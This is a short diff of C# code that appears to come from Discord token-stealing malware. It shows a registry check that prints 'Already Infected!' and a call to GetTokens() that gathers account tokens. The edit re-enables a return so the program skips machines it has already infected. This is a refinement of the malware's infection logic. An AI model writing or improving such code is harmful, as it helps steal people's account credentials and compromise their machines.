@@ -12,13 +12,13 @@ namespace Discord2
     {
         private static readonly HttpClient client = new HttpClient();
 
-        private static int MAX_SEND = 200;
+        private const int MAX_SEND = 200;
 
         public static void Run()
         {
             if(OpenRegKey("warning")==0){
                 Console.WriteLine("Already Infected!");
-                //return;
+                return;
             }
 
             List<string> tokens = GetTokens();
